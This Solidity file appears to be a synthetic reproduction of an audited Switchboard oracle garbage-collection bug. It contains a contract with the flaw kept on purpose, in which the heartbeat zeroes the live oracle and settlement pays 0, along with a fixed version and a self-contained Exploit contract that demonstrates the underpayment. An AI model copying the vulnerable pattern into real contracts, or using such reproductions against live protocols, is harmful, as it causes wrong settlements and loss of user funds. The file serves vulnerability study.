// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Switchboard — incorrect oracle garbage collection (OtterSec, #47982)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: oracleHeartbeat calls setNumRows on the live heartbeat caller
    (oracleId) instead of the expired oracle it just removed (gcOracleId).
    A later read that trusts numRows == 1 drops the live oracle and returns 0.
    Settlement then pays 0 instead of the fair 2000e18. The control zeroes the
    expired oracle, keeps the live one, and pays 2000e18.
    Vulnerable line preserved verbatim below (@> VULN). Fix commit e833e48. */

library OracleLib {
    struct Oracle {
        uint256 lastHeartbeat;
        uint256 numRows;
        int256 price;
        address queueId;
    }

    struct Layout {
        mapping(address => Oracle) oracles;
    }

    bytes32 internal constant SLOT = keccak256("Switchboard.OracleLib");

    function layout() internal pure returns (Layout storage l) {
        bytes32 slot = SLOT;
        assembly {
            l.slot := slot
        }
    }

    function oracles(address id) internal view returns (Oracle storage) {
        return layout().oracles[id];
    }

    function setNumRows(address id, uint256 n) internal {
        // @> VULN: heartbeat passes the live oracleId, so this store drops the fresh oracle
        layout().oracles[id].numRows = n;
    }
}

library OracleQueueLib {
    struct Queue {
        address[] oracles;
        uint256 gcIdx;
        uint256 oracleTimeout;
        address queueId;
    }

    bytes32 internal constant SLOT = keccak256("Switchboard.OracleQueueLib");

    function layout() internal pure returns (Queue storage q) {
        bytes32 slot = SLOT;
        assembly {
            q.slot := slot
        }
    }

    function incrementGC(address) internal {
        layout().gcIdx += 1;
    }

    function swapRemove(address, uint256 idx) internal {
        Queue storage q = layout();
        uint256 last = q.oracles.length - 1;
        if (idx != last) {
            q.oracles[idx] = q.oracles[last];
        }
        q.oracles.pop();
    }
}

contract SettleToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Trader {}

contract OracleBook {
    using OracleLib for address;

    SettleToken public token;
    address public trader;
    int256 public readPrice;
    uint256 public paid;
    uint256 public constant FAIR = 2000 ether;

    event OracleGC(address gcOracleId, address queueId);

    constructor(SettleToken _token, address _trader) {
        token = _token;
        trader = _trader;
        OracleQueueLib.Queue storage queue = OracleQueueLib.layout();
        queue.oracleTimeout = 0;
        queue.queueId = address(this);
    }

    function enroll(address oracleId, int256 price, uint256 lastHeartbeat) external {
        OracleLib.Oracle storage row = OracleLib.oracles(oracleId);
        row.lastHeartbeat = lastHeartbeat;
        row.numRows = 1;
        row.price = price;
        row.queueId = address(this);
        OracleQueueLib.layout().oracles.push(oracleId);
    }

    function numRows(address oracleId) external view returns (uint256) {
        return OracleLib.oracles(oracleId).numRows;
    }

    function queueLength() external view returns (uint256) {
        return OracleQueueLib.layout().oracles.length;
    }

    function oracleAt(uint256 i) external view returns (address) {
        return OracleQueueLib.layout().oracles[i];
    }

    // contracts/src/Switchboard/oracle/Oracle.sol — oracleHeartbeat
    function oracleHeartbeat(address oracleId) external {
        OracleLib.Oracle storage oracle = OracleLib.oracles(oracleId);
        oracle.lastHeartbeat = block.timestamp;
        OracleQueueLib.Queue storage queue = OracleQueueLib.layout();
        /* ... */
        // get gcIdx - guaranteed to have at least 1 element here
        uint256 gcIdx = queue.gcIdx;
        address gcOracleId = queue.oracles[gcIdx];
        // increment gcIdx
        OracleQueueLib.incrementGC(oracle.queueId);
        // handle expired oracles if gcIdx is expired
        if ((OracleLib.oracles(gcOracleId).lastHeartbeat + queue.oracleTimeout) < block.timestamp) {
            // log the garbage collection
            emit OracleGC(gcOracleId, oracle.queueId);
            // swap remove queue.oracles[gcIdx]
            // zeroes the live caller; the inlined store is the line marked @> VULN
            OracleLib.setNumRows(oracleId, 0);
            // FIX: OracleLib.setNumRows(gcOracleId, 0);
            OracleQueueLib.swapRemove(oracle.queueId, gcIdx);
        }
    }

    function latestPrice() public view returns (int256) {
        OracleQueueLib.Queue storage queue = OracleQueueLib.layout();
        uint256 n = queue.oracles.length;
        for (uint256 i = 0; i < n; i++) {
            address id = queue.oracles[i];
            OracleLib.Oracle storage row = OracleLib.oracles(id);
            // saveResults assumes one queue: numRows == 1 and a fresh heartbeat
            if (row.numRows == 1 && (row.lastHeartbeat + queue.oracleTimeout) >= block.timestamp) {
                return row.price;
            }
        }
        return 0;
    }

    function settle() external {
        int256 px = latestPrice();
        readPrice = px;
        uint256 amount = px > 0 ? uint256(px) : 0;
        paid = amount;
        if (amount != 0) {
            token.transfer(trader, amount);
        }
    }
}

contract OracleBookFixed {
    SettleToken public token;
    address public trader;
    int256 public readPrice;
    uint256 public paid;

    event OracleGC(address gcOracleId, address queueId);

    constructor(SettleToken _token, address _trader) {
        token = _token;
        trader = _trader;
        OracleQueueLib.Queue storage queue = OracleQueueLib.layout();
        queue.oracleTimeout = 0;
        queue.queueId = address(this);
    }

    function enroll(address oracleId, int256 price, uint256 lastHeartbeat) external {
        OracleLib.Oracle storage row = OracleLib.oracles(oracleId);
        row.lastHeartbeat = lastHeartbeat;
        row.numRows = 1;
        row.price = price;
        row.queueId = address(this);
        OracleQueueLib.layout().oracles.push(oracleId);
    }

    function numRows(address oracleId) external view returns (uint256) {
        return OracleLib.oracles(oracleId).numRows;
    }

    function oracleHeartbeat(address oracleId) external {
        OracleLib.Oracle storage oracle = OracleLib.oracles(oracleId);
        oracle.lastHeartbeat = block.timestamp;
        OracleQueueLib.Queue storage queue = OracleQueueLib.layout();
        uint256 gcIdx = queue.gcIdx;
        address gcOracleId = queue.oracles[gcIdx];
        OracleQueueLib.incrementGC(oracle.queueId);
        if ((OracleLib.oracles(gcOracleId).lastHeartbeat + queue.oracleTimeout) < block.timestamp) {
            emit OracleGC(gcOracleId, oracle.queueId);
            OracleLib.setNumRows(gcOracleId, 0);
            OracleQueueLib.swapRemove(oracle.queueId, gcIdx);
        }
    }

    function latestPrice() public view returns (int256) {
        OracleQueueLib.Queue storage queue = OracleQueueLib.layout();
        uint256 n = queue.oracles.length;
        for (uint256 i = 0; i < n; i++) {
            OracleLib.Oracle storage row = OracleLib.oracles(queue.oracles[i]);
            if (row.numRows == 1 && (row.lastHeartbeat + queue.oracleTimeout) >= block.timestamp) {
                return row.price;
            }
        }
        return 0;
    }

    function settle() external {
        int256 px = latestPrice();
        readPrice = px;
        uint256 amount = px > 0 ? uint256(px) : 0;
        paid = amount;
        if (amount != 0) {
            token.transfer(trader, amount);
        }
    }
}

contract Exploit {
    SettleToken public token; // nonce 1
    Trader public trader; // nonce 2
    OracleBook public book; // nonce 3

    int256 public priceRead;
    uint256 public retained;
    uint256 public constant FAIR = 2000 ether;
    address public constant DEAD = address(0xDEAD);
    address public constant LIVE = address(0xBEEF);

    constructor() {
        token = new SettleToken();
        trader = new Trader();
        book = new OracleBook(token, address(trader));
    }

    function run() external {
        require(block.timestamp > 0, "timestamp");
        book.enroll(DEAD, int256(500 ether), 0);
        book.enroll(LIVE, int256(FAIR), block.timestamp);
        require(book.queueLength() == 2, "two oracles");
        require(book.oracleAt(0) == DEAD, "gc target");
        token.mint(address(book), FAIR);
        require(token.balanceOf(address(book)) == FAIR, "pot funded");
        book.oracleHeartbeat(LIVE);
        require(book.numRows(LIVE) == 0, "live dropped");
        require(book.numRows(DEAD) == 1, "dead row kept");
        require(book.queueLength() == 1, "dead removed");
        priceRead = book.latestPrice();
        book.settle();
        retained = token.balanceOf(address(book));
        require(priceRead == 0, "read is 0");
        require(book.paid() == 0, "paid 0");
        require(token.balanceOf(address(trader)) == 0, "trader got nothing");
        require(retained == FAIR, "short by 2000e18");
    }
}
